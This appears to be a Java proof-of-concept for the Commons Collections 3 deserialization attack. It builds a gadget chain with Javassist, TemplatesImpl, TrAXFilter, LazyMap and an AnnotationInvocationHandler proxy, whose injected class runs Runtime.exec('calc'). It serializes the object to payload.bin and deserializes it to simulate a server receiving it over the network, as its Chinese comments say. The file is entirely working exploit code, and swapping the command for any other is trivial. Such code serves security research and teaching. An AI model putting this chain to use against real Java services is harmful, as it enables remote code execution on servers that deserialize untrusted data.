package org.dili.cc;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.Transformer;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class commons_collections3 {
    public static void main(String[] args) throws Exception{
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        ClassPool classPool = ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload = classPool.makeClass("CC3");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");

        byte[] bytes = payload.toBytecode();
        Object templatesImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();
        Field field = templatesImpl.getClass().getDeclaredField("_bytecodes");
        field.setAccessible(true);
        field.set(templatesImpl, new byte[][]{bytes});

        Field field1 = templatesImpl.getClass().getDeclaredField("_name");
        field1.setAccessible(true);
        field1.set(templatesImpl, "test");

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[] {Templates.class}, new Object[]{templatesImpl})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        //反射机制调用AnnotationInvocationHandler类的构造函数
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        //取消构造函数修饰符限制
        ctor.setAccessible(true);
        //获取AnnotationInvocationHandler类实例
        InvocationHandler invocationHandler=(InvocationHandler)ctor.newInstance(Override.class,lazyMap);
        Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);
        Object object=ctor.newInstance(Override.class,map1);


        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(object);

        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化
        fin.readObject();
    }
}

